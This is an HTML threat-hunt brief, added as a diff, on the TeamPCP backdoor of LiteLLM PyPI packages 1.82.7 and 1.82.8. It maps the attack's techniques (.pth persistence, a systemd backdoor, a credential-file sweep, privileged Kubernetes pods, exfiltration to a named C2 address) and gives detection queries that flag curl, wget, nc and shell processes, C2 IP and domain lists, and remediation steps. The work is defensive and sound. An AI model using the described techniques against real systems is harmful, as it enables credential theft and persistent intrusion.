+          <tr><td><span class="ioc">litellm_init.pth</span></td><td>File (site-packages)</td><td>Persistence mechanism — present in v1.82.8 only. Execute-on-startup.</td></tr>
+          <tr><td><code>litellm==1.82.7</code></td><td>PyPI package</td><td>Backdoored. Payload in <code>proxy/proxy_server.py</code></td></tr>
+          <tr><td><code>litellm==1.82.8</code></td><td>PyPI package</td><td>Backdoored + .pth persistence. Most dangerous variant.</td></tr>
+          <tr><td><span class="ioc">~/.config/sysmon/sysmon.py</span></td><td>File</td><td>Backdoor polling script dropped by Stage 3</td></tr>
+          <tr><td><span class="ioc">~/.config/systemd/user/sysmon.service</span></td><td>Systemd unit</td><td>Persistence service — survives reboots, polls C2</td></tr>
+          <tr><td><span class="ioc">node-setup-*</span> (kube-system)</td><td>K8s Pod</td><td>Attacker-deployed privileged pods with host filesystem mount</td></tr>
+          <tr><td><code>msbuild.exe</code> (Windows Startup)</td><td>Windows</td><td>Decoded from hangup.wav — persistent Windows implant</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">Affected Package Hashes (SHA-256)</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Package</th><th>SHA-256 Hash</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><code>litellm-1.82.7</code></td>
+            <td class="td-muted"><code>Refer to PyPI quarantine record / Sonatype OSS Index for authoritative hash</code></td>
+            <td class="td-critical">MALICIOUS</td>
+          </tr>
+          <tr>
+            <td><code>litellm-1.82.8</code></td>
+            <td class="td-muted"><code>Refer to PyPI quarantine record / Sonatype OSS Index for authoritative hash</code></td>
+            <td class="td-critical">MALICIOUS</td>
+          </tr>
+          <tr>
+            <td><code>litellm-1.82.6</code></td>
+            <td class="td-muted"><code>Last known-clean version — published 2026-03-22</code></td>
+            <td class="td-green">CLEAN</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ── 05 MITRE ATT&CK ── -->
+  <section id="mitre">
+    <div class="section-header">
+      <span class="section-num green">05</span>
+      <h2>MITRE ATT&amp;CK Mapping — TeamPCP TTPs</h2>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Tactic</th><th>Technique ID</th><th>Technique Name</th><th>How TeamPCP Used It</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Initial Access</td>
+            <td><span class="mitre-id">T1195.001</span></td>
+            <td>Supply Chain Compromise: Compromise Software Dependencies</td>
+            <td>Poisoned Trivy CI action to gain access to downstream projects</td>
+          </tr>
+          <tr>
+            <td>Initial Access</td>
+            <td><span class="mitre-id">T1078</span></td>
+            <td>Valid Accounts</td>
+            <td>Used stolen PyPI publish token to publish malicious packages as legitimate maintainer</td>
+          </tr>
+          <tr>
+            <td>Execution</td>
+            <td><span class="mitre-id">T1059.006</span></td>
+            <td>Command and Scripting Interpreter: Python</td>
+            <td>Embedded Python payload in .pth file and proxy_server.py; executes at import/startup</td>
+          </tr>
+          <tr>
+            <td>Persistence</td>
+            <td><span class="mitre-id">T1543.002</span></td>
+            <td>Create or Modify System Process: Systemd Service</td>
+            <td>Installed user-level sysmon.service to survive reboots and poll C2</td>
+          </tr>
+          <tr>
+            <td>Persistence</td>
+            <td><span class="mitre-id">T1546</span></td>
+            <td>Event Triggered Execution</td>
+            <td>.pth file triggers payload on every Python interpreter startup</td>
+          </tr>
+          <tr>
+            <td>Credential Access</td>
+            <td><span class="mitre-id">T1552.001</span></td>
+            <td>Unsecured Credentials: Credentials In Files</td>
+            <td>Swept 50+ credential file paths including .env, .aws, .kube, .ssh</td>
+          </tr>
+          <tr>
+            <td>Credential Access</td>
+            <td><span class="mitre-id">T1552.004</span></td>
+            <td>Unsecured Credentials: Private Keys</td>
+            <td>Targeted SSH private keys and TLS certificates</td>
+          </tr>
+          <tr>
+            <td>Discovery</td>
+            <td><span class="mitre-id">T1083</span></td>
+            <td>File and Directory Discovery</td>
+            <td>Enumerated credential locations, shell history, cloud config directories</td>
+          </tr>
+          <tr>
+            <td>Lateral Movement</td>
+            <td><span class="mitre-id">T1610</span></td>
+            <td>Deploy Container</td>
+            <td>Deployed privileged alpine pods to every K8s node in kube-system; mounted host FS</td>
+          </tr>
+          <tr>
+            <td>Exfiltration</td>
+            <td><span class="mitre-id">T1041</span></td>
+            <td>Exfiltration Over C2 Channel</td>
+            <td>HTTP POST of encrypted credential bundle to 83.142.209.203:8080</td>
+          </tr>
+          <tr>
+            <td>C2</td>
+            <td><span class="mitre-id">T1102</span></td>
+            <td>Web Service</td>
+            <td>CanisterWorm used ICP blockchain canister as C2 dead-drop — resistant to takedown</td>
+          </tr>
+          <tr>
+            <td>Defense Evasion</td>
+            <td><span class="mitre-id">T1027</span></td>
+            <td>Obfuscated Files or Information</td>
+            <td>Base64-encoded payload in .py file; XOR-obfuscated executable disguised as .wav audio</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ── 06 THREAT HUNTING ── -->
+  <section id="hunting">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>Threat Hunting Queries &amp; Detection</h2>
+    </div>
+
+    <p>Use the following queries to hunt across your environment. Prioritize systems where Python is used in production, CI/CD pipelines, and any deployment running an LLM integration layer.</p>
+
+    <!-- Host-based: File System Checks -->
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">Host-Based — File System Checks</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — Compromise Detection Script</span>
+        <span class="code-desc">Run on every potentially affected host</span>
+      </div>
+      <pre><span class="cm">#!/bin/bash</span>
+<span class="cm"># TeamPCP / LiteLLM Compromise Detection</span>
+<span class="cm"># Run as: bash litellm-hunt.sh | tee hunt-results.txt</span>
+
+echo <span class="st">"[*] Checking litellm version..."</span>
+pip show litellm 2>/dev/null | grep <span class="st">"Version:"</span>
+
+echo <span class="st">"[*] Scanning for malicious .pth file..."</span>
+find / -name <span class="st">"litellm_init.pth"</span> 2>/dev/null &amp;&amp; echo <span class="st">"ALERT: .pth FOUND"</span>
+
+echo <span class="st">"[*] Checking for sysmon backdoor artifacts..."</span>
+<span class="op">test</span> -f ~/.config/sysmon/sysmon.py &amp;&amp; echo <span class="st">"ALERT: sysmon.py FOUND"</span>
+<span class="op">test</span> -f ~/.config/systemd/user/sysmon.service &amp;&amp; echo <span class="st">"ALERT: sysmon.service FOUND"</span>
+
+echo <span class="st">"[*] Checking systemd user services..."</span>
+systemctl --user list-units --type=service 2>/dev/null | grep sysmon
+
+echo <span class="st">"[*] Checking for attacker K8s pods (if kubectl available)..."</span>
+kubectl get pods -n kube-system 2>/dev/null | grep <span class="st">"node-setup-"</span>
+
+echo <span class="st">"[*] Checking network connections to C2..."</span>
+ss -tnp | grep <span class="st">"83.142.209"</span>
+netstat -tnp 2>/dev/null | grep <span class="st">"83.142.209"</span>
+
+echo <span class="st">"[*] Checking DNS resolution of C2 domains..."</span>
+host models.litellm.cloud 2>/dev/null | grep <span class="st">"83.142.209"</span> &amp;&amp; echo <span class="st">"ALERT: C2 domain resolved"</span>
+host checkmarx.zone 2>/dev/null | grep <span class="st">"83.142.209"</span> &amp;&amp; echo <span class="st">"ALERT: C2 domain resolved"</span>
+
+echo <span class="st">"[*] Checking pip audit..."</span>
+pip-audit 2>/dev/null | grep litellm
+
+echo <span class="st">"[*] Hunt complete."</span></pre>
+    </div>
+
+    <!-- Splunk -->
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">SIEM — Splunk SPL Queries</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Splunk SPL</span>
+        <span class="code-desc">Network connections to TeamPCP C2 infrastructure</span>
+      </div>
+      <pre><span class="cm">| Search for outbound connections to TeamPCP C2 IPs and domains</span>
+index=network_traffic
+  (dest_ip="83.142.209.203" OR dest_ip="83.142.209.11"
+   OR dest_host="*litellm.cloud" OR dest_host="*checkmarx.zone")
+| eval threat="TeamPCP-C2"
+| table _time, src_ip, src_host, dest_ip, dest_host, dest_port, bytes_out, process
+| sort -_time</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Splunk SPL</span>
+        <span class="code-desc">Python processes spawning child processes from site-packages (.pth execution)</span>
+      </div>
+      <pre><span class="cm">| Detect .pth-triggered execution: python spawning unusual child processes</span>
+index=endpoint sourcetype=sysmon EventCode=1
+  parent_process_name="python*"
+  (process_name IN ("curl", "wget", "nc", "bash", "sh", "python*"))
+  NOT (cmdline="*pip*" OR cmdline="*pytest*" OR cmdline="*unittest*")
+| eval risk="HIGH - Python spawned shell/download tool"
+| table _time, host, user, parent_process_name, process_name, cmdline
+| sort -_time</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Splunk SPL</span>
+        <span class="code-desc">Systemd user service creation — sysmon.service persistence</span>
+      </div>
+      <pre><span class="cm">| Hunt for sysmon.service persistence artifact on Linux endpoints</span>
+index=endpoint sourcetype=sysmon EventCode=11
+  TargetFilename="*/.config/systemd/user/sysmon.service"
+| eval alert="CRITICAL - TeamPCP Persistence Service Installed"
+| table _time, host, user, TargetFilename
+| sort -_time</pre>
+    </div>
+
+    <!-- KQL / Microsoft Sentinel -->
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">SIEM — Microsoft Sentinel KQL Queries</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">Network connections to TeamPCP C2 (Azure Firewall / NSG / Defender for Endpoint)</span>
+      </div>
+      <pre><span class="cm">// TeamPCP C2 Infrastructure — Network Threat Hunt</span>
+<span class="cm">// Covers Azure Firewall, NSG Flow Logs, Defender for Endpoint</span>
+<span class="kw">let</span> C2_IPs = dynamic([<span class="st">"83.142.209.203"</span>, <span class="st">"83.142.209.11"</span>]);
+<span class="kw">let</span> C2_Domains = dynamic([<span class="st">"models.litellm.cloud"</span>, <span class="st">"checkmarx.zone"</span>]);
+<span class="kw">let</span> HuntWindow = <span class="fn">ago</span>(7d);
+
+DeviceNetworkEvents
+| <span class="kw">where</span> TimeGenerated > HuntWindow
+| <span class="kw">where</span> RemoteIP <span class="kw">in</span> (C2_IPs)
+    <span class="kw">or</span> RemoteUrl <span class="fn">has_any</span> (C2_Domains)
+| <span class="kw">project</span> TimeGenerated, DeviceName, InitiatingProcessAccountName,
+          InitiatingProcessFileName, InitiatingProcessCommandLine,
+          RemoteIP, RemoteUrl, RemotePort, BytesSent
+| <span class="kw">extend</span> Severity = <span class="st">"Critical"</span>, ThreatActor = <span class="st">"TeamPCP"</span>
+| <span class="kw">order by</span> TimeGenerated <span class="kw">desc</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">litellm_init.pth file creation — persistence detection</span>
+      </div>
+      <pre><span class="cm">// Detect litellm_init.pth file creation in Python site-packages</span>
+DeviceFileEvents
+| <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(14d)
+| <span class="kw">where</span> FileName == <span class="st">"litellm_init.pth"</span>
+    <span class="kw">or</span> FolderPath <span class="fn">has</span> <span class="st">"sysmon"</span>
+| <span class="kw">project</span> TimeGenerated, DeviceName, InitiatingProcessAccountName,
+          ActionType, FolderPath, FileName, SHA256, InitiatingProcessFileName
+| <span class="kw">extend</span> Alert = <span class="st">"CRITICAL - TeamPCP Persistence Artifact"</span>
+| <span class="kw">order by</span> TimeGenerated <span class="kw">desc</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">GitHub Actions secrets exfiltration — CI/CD pipeline compromise detection</span>
+      </div>
+      <pre><span class="cm">// Detect CI/CD credential exfiltration from GitHub Actions runners</span>
+<span class="cm">// Look for outbound connections from GitHub-hosted or self-hosted runners</span>
+GitHubAuditLog
+| <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(30d)
+| <span class="kw">where</span> Action <span class="fn">has_any</span> (<span class="st">"workflows.run"</span>, <span class="st">"actions.runner"</span>)
+    <span class="kw">and</span> (AdditionalFields <span class="fn">has</span> <span class="st">"trivy"</span> <span class="kw">or</span> AdditionalFields <span class="fn">has</span> <span class="st">"aquasecurity"</span>)
+| <span class="kw">project</span> TimeGenerated, Actor, Action, Repository, AdditionalFields
+| <span class="kw">extend</span> Risk = <span class="st">"HIGH - Potential Trivy CI Compromise in Workflow"</span></pre>
+    </div>
+
+    <!-- pip / package audit -->
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">Package Audit — Python Environments</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — Enterprise Package Sweep</span>
+        <span class="code-desc">Scan all pip environments across an organization (adjust path patterns)</span>
+      </div>
+      <pre><span class="cm"># Sweep all Python environments for compromised litellm versions</span>
+<span class="cm"># Run from a central management host or via ansible/SSH automation</span>
+
+<span class="kw">for</span> pip_bin in $(find / -name pip3 -o -name pip 2>/dev/null | grep -v proc); <span class="kw">do</span>
+  version=$($pip_bin show litellm 2>/dev/null | grep <span class="st">"^Version:"</span> | awk <span class="st">'{print $2}'</span>)
+  <span class="kw">if</span> [[ <span class="st">"$version"</span> == <span class="st">"1.82.7"</span> || <span class="st">"$version"</span> == <span class="st">"1.82.8"</span> ]]; <span class="kw">then</span>
+    echo <span class="st">"COMPROMISED: $pip_bin → litellm $version"</span>
+  <span class="kw">fi</span>
+<span class="kw">done</span>
+
+<span class="cm"># Also check for .pth file regardless of installed version</span>
+find /usr /home /opt /root -name <span class="st">"litellm_init.pth"</span> 2>/dev/null \
+  | xargs -I{} echo <span class="st">"BACKDOOR FOUND: {}"</span></pre>
+    </div>
+  </section>
+
+  <!-- ── 07 INCIDENT RESPONSE ── -->
+  <section id="response">
+    <div class="section-header">
+      <span class="section-num warn">07</span>
+      <h2>Incident Response — GovCon &amp; GCC Playbook</h2>
+    </div>
+
+    <div class="alert alert-critical">
+      <span class="alert-icon">🚨</span>
+      <div class="alert-body">
+        <div class="alert-title">If Compromise is Confirmed</div>
+        <p>Treat the <strong>entire host</strong> as fully compromised. Do not attempt to clean and continue. Isolate, capture forensic artifacts, then rebuild from a known-good image. All secrets accessible on the host must be considered exfiltrated.</p>
+      </div>
+    </div>
+
+    <ul class="step-list">
+      <li>
+        <div>
+          <h4>Identify Exposure Window</h4>
+          <p>Determine if any host pip-installed or upgraded litellm on March 24, 2026 between 10:39 UTC and 16:00 UTC. Check pip history logs, CI/CD build logs, Docker build caches, and requirements.txt lock files.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Isolate Affected Systems</h4>
+          <p>Remove affected hosts from network segments. For GCC environments: quarantine from GCC tenant, revoke associated managed identities, and disable service principals before investigation.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Rotate ALL Secrets on Affected Hosts</h4>
+          <p>This is non-negotiable. Rotate: LLM API keys (OpenAI, Azure, Anthropic, Bedrock), AWS/GCP/Azure credentials, SSH key pairs, Kubernetes service account tokens, database passwords, .env values, GitHub PATs, npm tokens, HashiCorp Vault tokens, and any CI/CD secrets accessible in the environment.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Remove Backdoor Artifacts</h4>
+          <p>Remove litellm_init.pth from all Python site-packages, stop and disable sysmon.service (<code>systemctl --user stop sysmon.service &amp;&amp; systemctl --user disable sysmon.service</code>), delete <code>~/.config/sysmon/</code>, and delete attacker K8s pods (<code>kubectl delete pod -n kube-system -l app=node-setup</code>).</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Upgrade to Clean litellm Version</h4>
+          <p>Uninstall the compromised version and reinstall: <code>pip uninstall litellm -y &amp;&amp; pip install litellm==1.82.6</code> or the latest verified clean version. Pin versions in requirements.txt and use hash verification in production.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Review Kubernetes Cluster Integrity</h4>
+          <p>Enumerate all pods in kube-system for unauthorized containers. Review RBAC bindings for anomalous service account permissions. Consider cluster credential rotation if a K8s config was present on any compromised host.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>GovCon / GCC Notification Obligations</h4>
+          <p>Assess FISMA/CMMC reporting obligations if CUI-adjacent systems were exposed. GCC tenants should notify their ISSO and review FedRAMP boundary impact. Review DFARS 252.204-7012 cyber incident reporting requirements (72-hour window to DoD).</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Harden CI/CD Pipeline Going Forward</h4>
+          <p>Pin all third-party GitHub Actions to commit SHAs (not tags). Use OIDC instead of long-lived PATs for PyPI publishing. Enable PyPI trusted publishers. Implement supply chain security policies via SLSA or in-toto attestations.</p>
+        </div>
+      </li>
+    </ul>
+
+    <div class="alert alert-info" style="margin-top: 28px;">
+      <span class="alert-icon">🔧</span>
+      <div class="alert-body">
+        <div class="alert-title">Free Detection Tool Available</div>
+        <p><strong>jthack/litellm-vuln-detector</strong> (GitHub) — Community tool that scans for malicious .pth files, persistence backdoors, exfiltration domains, and attacker K8s pods. Point Wild also released a free scanner within 24 hours of the attack. See Resources section.</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ── 08 RESOURCES ── -->
+  <section id="resources">
+    <div class="section-header">
+      <span class="section-num blue">08</span>
+      <h2>Resources &amp; References</h2>
+    </div>
+
+    <p>All primary sources used in this brief. Verify IOCs and detection rules against the primary sources before deploying in production environments.</p>
+
+    <h3 style="color:#fff; font-size:14px; margin-bottom:12px; margin-top:4px;">Official Advisories &amp; Vendor Analysis</h3>
+    <ul class="resource-list">
+      <li>
+        <span class="resource-icon">🏛️</span>
+        <div class="resource-body">
+          <a href="https://docs.litellm.ai/blog/security-update-march-2026" target="_blank">LiteLLM Official Security Update — March 2026</a>
+          <p>Maintainer's incident statement, affected versions, and remediation guidance</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔵</span>
+        <div class="resource-body">
+          <a href="https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/" target="_blank">Microsoft Security Blog — Detecting &amp; Defending Against the Trivy Supply Chain Compromise</a>
+          <p>Microsoft's guidance for Azure/GCC environments — KQL queries and Defender for Endpoint detections</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🐕</span>
+        <div class="resource-body">
+          <a href="https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/" target="_blank">Datadog Security Labs — LiteLLM and Telnyx Compromised on PyPI: Tracing the TeamPCP Campaign</a>
+          <p>Most comprehensive technical analysis; IOC CSV available on GitHub; Telnyx compromise details</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔍</span>
+        <div class="resource-body">
+          <a href="https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign" target="_blank">Wiz Blog — Three's a Crowd: TeamPCP Trojanizes LiteLLM</a>
+          <p>Cloud security perspective; K8s lateral movement analysis; campaign context</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔬</span>
+        <div class="resource-body">
+          <a href="https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer" target="_blank">Sonatype — Compromised litellm PyPI Package Delivers Multi-Stage Credential Stealer</a>
+          <p>Multi-stage payload analysis, package hashes, and OSS Index records</p>
+        </div>
+      </li>
+    </ul>
+
+    <h3 style="color:#fff; font-size:14px; margin-bottom:12px; margin-top:24px;">Deep Technical Analysis</h3>
+    <ul class="resource-list">
+      <li>
+        <span class="resource-icon">🐍</span>
+        <div class="resource-body">
+          <a href="https://snyk.io/articles/poisoned-security-scanner-backdooring-litellm/" target="_blank">Snyk — How a Poisoned Security Scanner Became the Key to Backdooring LiteLLM</a>
+          <p>Root cause analysis of the Trivy → CI/CD → PyPI token theft chain</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">📦</span>
+        <div class="resource-body">
+          <a href="https://www.reversinglabs.com/blog/teampcp-supply-chain-attack-spreads" target="_blank">ReversingLabs — Inside the TeamPCP Cascading Supply Chain Attack</a>
+          <p>Full campaign breadth; npm/CanisterWorm analysis; ICP blockchain C2 technique</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🌐</span>
+        <div class="resource-body">
+          <a href="https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html" target="_blank">Trend Micro — Your AI Gateway Was a Backdoor: Inside the LiteLLM Supply Chain Compromise</a>
+          <p>TTPs, payload reconstruction, and defensive recommendations</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🐺</span>
+        <div class="resource-body">
+          <a href="https://arcticwolf.com/resources/blog/teampcp-supply-chain-attack-campaign-targets-trivy-checkmarx-kics-and-litellm-potential-downstream-impact-to-additional-projects/" target="_blank">Arctic Wolf — TeamPCP Supply Chain Attack: Potential Downstream Impact</a>
+          <p>Downstream impact analysis; detection signatures; broader ecosystem risk assessment</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🏃</span>
+        <div class="resource-body">
+          <a href="https://ramimac.me/teampcp/" target="_blank">ramimac.me — TeamPCP Supply Chain Campaign: Full Attack Timeline &amp; IOCs</a>
+          <p>Community-maintained IOC list and campaign timeline — cross-referenced with multiple vendor reports</p>
+        </div>
+      </li>
+    </ul>
+
+    <h3 style="color:#fff; font-size:14px; margin-bottom:12px; margin-top:24px;">Detection &amp; Response Tools</h3>
+    <ul class="resource-list">
+      <li>
+        <span class="resource-icon">🛠️</span>
+        <div class="resource-body">
+          <a href="https://hunt.io/blog/33k-exposed-litellm-teampcp-c2-supply-chain-attack" target="_blank">Hunt.io — 33K Exposed LiteLLM Deployments &amp; the C2 Servers Behind TeamPCP</a>
+          <p>Attack surface analysis; C2 infrastructure mapping; exposed deployment enumeration</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔎</span>
+        <div class="resource-body">
+          <a href="https://cycode.com/blog/lite-llm-supply-chain-attack/" target="_blank">Cycode — LiteLLM Supply Chain Attack: What Happened and How to Respond</a>
+          <p>AppSec-focused response guidance; GitHub Actions hardening checklist; SLSA recommendations</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🌐</span>
+        <div class="resource-body">
+          <a href="https://www.endorlabs.com/learn/teampcp-isnt-done" target="_blank">Endor Labs — TeamPCP Isn't Done: LiteLLM's 95 Million Monthly Downloads on PyPI</a>
+          <p>Ongoing campaign tracking; downstream project impact analysis; SCA scanning guidance</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔐</span>
+        <div class="resource-body">
+          <a href="https://www.truesec.com/hub/blog/malicious-pypi-package-litellm-supply-chain-compromise" target="_blank">Truesec — Malicious PyPI Package: LiteLLM Supply Chain Compromise</a>
+          <p>Forensic artifact walkthrough; IOC hashes; incident response procedure</p>
+        </div>
+      </li>
+    </ul>
+  </section>
+
+</div>
+</main>
+
+<!-- ── Footer ── -->
+<footer>
+  <div class="container">
+    <p><strong>SOC Threat Hunt Brief — TeamPCP / LiteLLM PyPI Supply Chain Attack</strong></p>
+    <p style="margin-top:6px;">CVE-2026-33634 &nbsp;|&nbsp; CVSS4B: 9.4 (Critical) &nbsp;|&nbsp; TLP:AMBER &nbsp;|&nbsp; Published: March 30, 2026</p>
+    <p style="margin-top:8px; color:#555;">This document is intended for internal SOC personnel and authorized GovCon/GCC security teams. Handle per TLP:AMBER guidelines. All IOCs should be verified against primary sources before deployment. All C2 indicators are defanged for safe distribution.</p>
+  </div>
+</footer>
+
+</body>
+</html>
